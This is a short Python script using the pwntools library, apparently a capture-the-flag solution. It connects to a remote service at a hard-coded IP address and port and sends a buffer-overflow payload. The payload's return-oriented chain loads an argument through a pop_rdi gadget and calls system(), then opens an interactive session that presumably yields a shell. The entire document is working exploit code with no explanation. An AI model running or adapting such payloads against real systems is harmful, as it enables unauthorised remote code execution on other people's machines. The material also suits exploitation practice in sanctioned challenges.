from pwn import *
context.log_level='debug'
r=remote('220.249.52.133',40669)
pop_rdi=0x400773
argument=0x400794
system=0x400540
r.recvuntil('bof')
payload='A'*0x4+p64(pop_rdi)+p64(argument)+p64(system)
r.sendline(payload)
r.interactive()
